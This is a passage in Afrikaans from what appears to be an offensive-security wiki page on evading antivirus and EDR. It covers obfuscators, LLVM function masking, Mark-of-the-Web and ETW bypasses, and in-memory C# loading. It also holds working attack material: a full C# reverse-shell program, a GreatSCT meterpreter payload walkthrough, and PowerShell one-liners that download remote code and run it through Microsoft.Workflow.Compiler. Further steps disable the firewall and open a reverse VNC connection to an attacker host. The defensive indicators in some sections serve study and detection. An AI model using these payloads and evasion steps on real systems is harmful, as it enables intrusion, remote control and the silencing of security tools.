- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word, wat die lewe van iemand wat die toepassing wil kraak ’n bietjie moeiliker maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64-binêre obfuscator wat verskeie PE-lêers kan obfuskeer, waaronder .exe, .dll en .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese code-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige code-obfuskasieraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op samestellingscodevlak deur gewone instruksies in ROP-kettings om te skakel, wat ons natuurlike begrip van normale beheervloei verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL-lêers na shellcode omskakel en dit dan laai

### LLVM compiler-ondersteunde self-masking per funksie

In plaas daarvan om ’n hele implant slegs te maskeer terwyl dit slaap, kan ’n gewysigde LLVM X86-backend geselekteerde funksies met XOR maskeer wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemanglede name wat `REG_` bevat, voeg posisie-onafhanklike in- en uitgangsstubs om die finale masjiencode in, en skryf een gedeelde masking handler in `.text`; handtekeninge op broncodeniveau en die Windows x64-aanroepkonvensie bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-beheervloeitransformasie

Dit hoort ná instruksiekeuse en -optimering, omdat die transformasie **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n `MachineFunctionPass` voor uitreiking vind die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad na die aangehegte epiloog deurval, en vervang vroeëre returns met `JMP_1 handler`. Behou enige deur die compiler gegenereerde stapel-/raamafbreekcode wat elke return voorafgaan; herlei slegs die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` skryf die stubs vir elke funksie uit, terwyl `emitEndOfAsmFile()` die handler uitskryf. Simbole wat tussen uitreikingsfases gedeel word, laat ’n proloogvertakking toe om na sy latere epiloog te spring; skryf vir ’n handmatig uitgeskryfde nabygeleë `je` `0F 84` gevolg deur die viergreep-MC-uitdrukking `target - address_after_je`. Oproepe en spronge na die handler kan eerder as `MCInst`-objekte (`CALL64pcrel32` en `JMP_1`) uitgereik word. ’n Pass moet `false` teruggee vir ’n ongeselekteerde funksie wanneer dit niks verander het nie; die PoC gee op dié pad verkeerdelik `true` terug.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata en initialisering voor die CRT

Die PoC plaas ’n XOR-sleutel en 16-greep-rekords met ’n deur die loader herlokeerde funksiewyser plus ’n looptydlengte in `.funcmeta`. Hoewel die C-veld ’n `uint32_t` is, lees die handler ’n QWORD by rekordoffset `+8`, wat die lengte en sy opvulling insluit, en skuif rekords met `0x10` aan. PE-seksiename is net agt grepe lank, dus sien die looptydsoektog `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou toegangspunt-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub kry die image base van `gs:[0x60]` → `[PEB+0x10]`, loop deur PE32+-imports om ’n reeds ingevoerde `VirtualProtect` op te spoor, en loop voor die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialisering stel ’n sentinelwaarde in `gs:[0xE8]` en roep elke metadata-funksie aan. Die proloog, wat permanent leesbaar is, teken die funksiebegin in `gs:[0xF0]` aan, bespeur die sentinelwaarde en slaan die liggaam oor terwyl dit nog ontmasker is. Die epiloog gebruik dan `call handler`; nadat die handler 13 registers (`0x68` grepe) gestoor het, is die terugkeeradres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` na die metadatarekord geskryf kan word. Nadat al die liggame gemasker is, maak die stub die sentinelwaarde skoon en spring na `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n normale oproep roep die proloog dieselfde simmetriese handler aan om die liggaam te dekodeer. Die finale pad val deur na die aangehegte epiloog, terwyl elke vroeëre return regstreeks na die gedeelde handler spring. Die normale epiloog gebruik ook `jmp handler` in plaas van `call`, sodat die handler se `ret` die oorspronklike oproeper se terugkeeradres gebruik nadat dit hermaskeer het, en die funksieresultaat in `RAX` behoue bly.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskeringsprimitief en ontledingsaanwysers

Die handler vind die huidige rekord, slaan die vaste sigbare proloog (`0x46` grepe in hierdie bou) oor, verander die res na `PAGE_EXECUTE_READWRITE`, pas XOR greep vir greep met die lae greep van die sleutel toe, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus dekodeer dus met toegang en enkodeer by elke normale uitgang.<sup>[[38]](#references)[[39]](#references)</sup>

Sterk aanwysers vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n toegangspunt binne ’n uitvoerbare `.stub` en ’n `.funcmet`-seksie met ’n sleutel plus herlokeerde `.text`-wysers;
- PEB-, invoertabel- en seksietabel-ontleding voor die CRT, gevolg deur oproepe via elke metadatawyser;
- identiese PIC-proloë met `call`/`pop` en talle terugkeerplekke wat na een handler herlei word;
- skrywes na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en XOR-skrywes greep vir greep na uitvoerbare bladsye wat deur die image gerugsteun word.

Dit is ontduiking van geheueskandeerders, nie kriptografiese beskerming nie: die gepatchte lêer bevat steeds die oorspronklike ontmaskerde liggaam, en ’n debugger kan by `VirtualProtect` of die XOR-lus breek en die aktiewe funksie dump. Die enkelgreep-XOR, leesbare metadata en vaste `0x46`-grens maak herstel vanlyn ook eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is thread-local, maar die gewysigde code-bladsye is proseswyd. Gelyktydige of rekursiewe toegang kan dus instruksies weer omkeer terwyl ’n ander aanroep dit uitvoer; uitsonderings en nie-plaaslike uitgange kan ook hermaskering omseil. ’n Robuuste implementering moet oorgange sinchroniseer, die beskerming herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stublengtes vermy, beide `call`- en `jmp`-paaie vir x64-stapelbelyning oudit, en `FlushInstructionCache` aanroep nadat uitvoerbare grepe herskryf is. Microsoft stel dit uitdruklik as die oproeper se verantwoordelikheid om instruksiekas-samehang te verseker wanneer uitvoerbare code gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sommige uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik volgens ’n reputasiegebaseerde benadering. Dit beteken dat toepassings wat selde afgelaai word SmartScreen sal aktiveer, wat die eindgebruiker waarsku en verhinder om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **vertroude** ondertekeningsertifikaat onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te keer dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer, soos ’n ISO, te verpak. Dit werk omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n nutsding wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demonstrasie van hoe om SmartScreen te omseil deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige aantekenmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeurtenisse aan te teken**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimteproses onmiddellik te laat terugkeer sonder om enige gebeurtenisse aan te teken. Dit word gedoen deur die funksie in die geheue te patch sodat dit onmiddellik terugkeer, wat ETW-aantekening vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Om C#-binaries in die geheue te laai, is al ’n geruime tyd bekend en is steeds ’n baie goeie manier om jou post-exploitation-nutsgoed uit te voer sonder om deur AV betrap te word.

Aangesien die payload direk in die geheue gelaai word sonder om aan die skyf te raak, hoef ons net bekommerd te wees oor die patch van AMSI vir die hele proses.

Die meeste C2-raamwerke (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C#-assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **die skep van ’n nuwe offerproses**, die inspuiting van jou kwaadwillige post-exploitation-kode in daardie nuwe proses, die uitvoering van jou kwaadwillige kode en, wanneer dit klaar is, die beëindiging van die nuwe proses. Dit hou voordele sowel as nadele in. Die voordeel van die fork-and-run-metode is dat uitvoering **buite** ons Beacon-implant-proses plaasvind. Dit beteken dat indien iets tydens ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat daar ’n **groter kans** is om deur **Gedragsopsporing** betrap te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels die inspuiting van die kwaadwillige post-exploitation-kode **in sy eie proses**. Só kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat indien iets tydens die uitvoering van jou payload verkeerd loop, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan omval.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer oor die laai van C#-assemblies wil lees, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C#-assemblies **vanuit PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly-herverpakking van .NET-nutsgoed (WasmForge)

Gewone `execute-assembly`-tegnieke behou herkenbare MSIL en inisialiseer uiteindelik ’n CLR. **WasmForge** verander eerder die uitvoeringsomgewing: dit migreer ’n C#-projek na die eksperimentele NativeAOT-LLVM WASI-teiken, kompileer dit vooraf na WebAssembly en sluit daardie module in ’n Wazero-gebaseerde Windows PE-gasheer in. Die gevolglike proses benodig nie die teiken se CLR, JIT of `dotnet`-gasheer nie, dus het reëls wat slegs op bestuurde assembly-name, CLR-laai, AMSI of .NET ETW gebaseer is, nie meer direkte sigbaarheid nie. Dit is ’n ontduikings-/verpakkingstegniek, nie ’n omseiling van ’n voorreggrens nie—die gas bestaan met die oorspronklike nutsding se toestemmings en waarneembare OS-gedrag.<sup>[[44]](#references)[[45]](#references)</sup>

### Bou van ’n C#-projek

Die aanbevole boumetode is die projek se Docker-omgewing, omdat dit die .NET 10 SDK, NativeAOT-LLVM-werklas, WASI SDK 24.0, linker en ondertekeningsafhanklikhede insluit. ’n `.csproj` word outomaties opgespoor; die eenmalige bouproses voer migrasie, versoenbaarheidspatching, WASM-kompilering, PE-smee en ondertekening uit.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Vir foutsporing of hersiening van gegenereerde kode, verdeel die proses in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` en ’n finale `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Die boubeeld gebruik ook ’n `wasm-component-ld`-omslag om die WASI Preview 2-komponentenkodering te vermy en die gewone module te produseer wat die ingebedde runtime verwag.<sup>[[44]](#references)[[45]](#references)</sup>

### Oorbrugging van wasm32 C# na x64 Win32

Dit is nie ’n deursigtige herkompilering nie. NativeAOT-WASI het nie sekere Windows-gerigte BCL-funksies nie, of verander hoe hulle werk, en ’n wasm32-gasheer allokeer gewoonlik viergreep-pointergleuwe, terwyl x64-API’s agtgreep-pointers kan teruggee. WasmForge pak albei probleme aan met die volgende gegenereerde lae:<sup>[[44]](#references)</sup>

1. ’n Bron-patcher herstel AOT-spesifieke semantiese verskille en herlei oproepe na register-, pype-, WMI-, identiteit-, gidsdiens-, lêerweergawe-, LSA- en soortgelyke funksies wat nie ondersteun word nie, na `Wf*`-helpers.
2. ’n P/Invoke-skandeerder genereer NativeAOT `DirectPInvoke`-karterings sodat `[DllImport]`-oproepe aan gekoppelde C-bridge-simbole bind, eerder as om die verklaarde DLL dinamies binne die gasheer te laai.
3. Pointers wat aan die gasheer gebonde is, gebruik `ulong` in C# en `uint64_t` in C. ’n Generiese dispatcher stuur die oproep deur na die gasheer se Win32-hanteerder; ’n `out8_mask` merk egte agtgreep-uitvoergleuwe waarvan die boonste helftes behou moet word. Ongemerkte uitvoere in wasm32-formaat gebruik momentopname-/herstelbeskerming, sodat ’n x64-skryfbewerking nie die aangrensende vier grepe kan beskadig nie.
4. Toegewyde gasheer-bridges hanteer bewerkings wat nie by generiese syscall-versending pas nie, soos toegang tot LSA-kaartjiekas, Kerberos-/BCrypt-bewerkings met gestruktureerde resultate, TCP KDC-verkeer en LDAP-navrae.

Byvoorbeeld, ’n omslag vir `version.dll!VerQueryValueW` stuur vier gasheeradresse deur en stel bisse 2 en 3 (`0xC`), omdat die waarde-pointer en lengte agtgreep-uitvoergleuwe is. Die omslag self bly generies en delegeer die DLL-naam, uitvoernaam, argumente en masker aan `wf_call_v2`; die gasheer voer pointer-vertaling uit en roep die native API aan.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Beperkings en opsporingspunte

Kode wat baie op reflection steun, dinamiese assembly-laai, arbitrêre native callbacks en komplekse x64-strukture wat na WASM-geheue teruggegee word, kan steeds gereedskapspesifieke patches vereis of heeltemal misluk. Generiese WASI Preview 2-sockets kan ook no-op-stubs bereik, daarom gebruik ondersteunde gereedskap protokolspesifieke host-shims. Valideer elke opdrag teen ’n native build eerder as om feature parity te aanvaar.<sup>[[44]](#references)[[45]](#references)</sup>

Die tegniek verskuif telemetrie eerder as om die payload onsigbaar te maak. Opsporing kan fokus op ’n PE wat ’n WASM-module bevat of materialiseer, Wazero-agtige runtime-gedrag, ongewone host-/guest-geheue-allokering en -kopiëring, generiese direkte Win32-dispatch, afwykings in signing en PE-resources, plus die gevolglike API-aanroepe en netwerkverkeer. Die afwesigheid van CLR-load-, AMSI- of .NET ETW-gebeurtenisse moet dus nie as bewys beskou word dat ’n proses skadeloos is nie.<sup>[[44]](#references)</sup>

## Ander programmeertale gebruik

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese signatures te omseil**. Toetse met ewekansige, geobfuskeerde reverse-shell-scripts in hierdie tale was suksesvol.

## WebAssembly-herhuisvesting vir ontduiking van statiese analise

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se voorregte te verminder, kan die proses aan die gang bly terwyl dit verhinder word om inspeksie- of herstelaksies uit te voer wat voorregte vereis.

Om dit te voorkom, kan Windows **eksterne prosesse verhinder** om handles na die tokens van sekuriteitsprosesse te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertroude sagteware gebruik

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te ontplooi en dit dan te gebruik om beheer daaroor oor te neem en volharding te behou:<sup>[[35]](#references)</sup>
1. Laai dit af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Laat die installeerder stilweg op die slagoffer se masjien loop (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik op next. Die wizard sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die vereiste aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder om die GUI te gebruik).
 

## Gevorderde ontduiking

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ontduiking is ’n baie ingewikkelde onderwerp. Soms moet jy baie verskillende telemetriebronne op een stelsel in ag neem, daarom is dit feitlik onmoontlik om in volwasse omgewings heeltemal onopgespoor te bly.

Elke omgewing waarteen jy optree, sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie deur [@ATTL4S](https://twitter.com/DaniLJ94) kyk om ’n vastrapplek in meer gevorderde ontduikingstegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie deur [@mariuszbit](https://twitter.com/mariuszbit) oor ontduiking in diepte.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou tegnieke**

### **Kyk watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik. Dit sal **dele van die binary verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou, en dit dan vir jou afsonder.\
Nog ’n hulpmiddel wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet-bediener**

Tot en met Windows10 het alle Windows-weergawes ’n **Telnet-bediener** ingesluit wat jy kon installeer (as administrateur) deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) en deaktiveer firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die setup nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in _VNC Password_
- Stel ’n wagwoord in _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die nuutgeskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Reverse connection**

Die **aanvaller** moet die binary `vncviewer.exe -listen 5900` op sy **gasheer** uitvoer sodat dit gereed sal wees om ’n omgekeerde **VNC-verbinding** te ontvang. Begin dan binne die **slagoffer** die winvnc-daemon met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit.

**WAARSKUWING:** Om stealth te behou, moet jy ’n paar dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Begin nou **die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Huidige Defender sal die proses baie vinnig beëindig.**

### Ons eie reverse shell saamstel

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Stel dit saam met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met behulp van compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuskators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Voorbeeld: Gebruik Python om inspuiters te bou

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
